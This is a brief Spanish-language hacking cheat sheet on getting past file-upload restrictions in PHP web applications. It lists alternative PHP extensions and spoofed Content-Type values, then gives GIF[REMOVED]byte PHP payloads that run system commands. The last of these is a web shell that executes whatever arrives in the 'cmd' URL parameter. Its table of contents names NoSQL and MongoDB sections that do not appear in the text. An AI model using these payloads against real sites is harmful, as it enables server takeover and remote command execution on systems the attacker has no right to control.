# Tipos de Bypass

> Conoce algunos tipos de bypass para difente proposito.

## Summary

* [Php](#php)
* [Exploit](#exploits)
  * [Authentication Bypass](#authentication-bypass)
  * [Extract length information](#extract-length-information)
  * [Extract data information](#extract-data-information)
* [Blind NoSQL](#blind-nosql)
  * [POST with JSON body](#post-with-json-body)
  * [POST with urlencoded body](#post-with-urlencoded-body)
  * [GET](#get)
* [MongoDB Payloads](#mongodb-payloads)
* [References](#references)

## Php

### subida de archivo

en ocaciones la web no nos permite subir directamente un archivo con extensión `.php` , pero quien sabe las politicas que
tenga implementada ese servidor, existen algunas extensiones que pueden ser de utilidad

- php
- php3
- php4
- php5
- pht
- phtml

### Content Type

otra forma de burlar la restricción de subida de archivos, es cambiando el `Content-Type`

- Content-Type: application/x-php
- Content-Type: image/jpg


### Magic Number

```php
GIF8;
system("whoami");
```

```php
GIF8;
shell_exec("whoami");
```

```php
GIF8;
echo passthru("whoami");
```

```php
GIF8;
$command=$_GET['cmd']; 
echo `$command`;
```
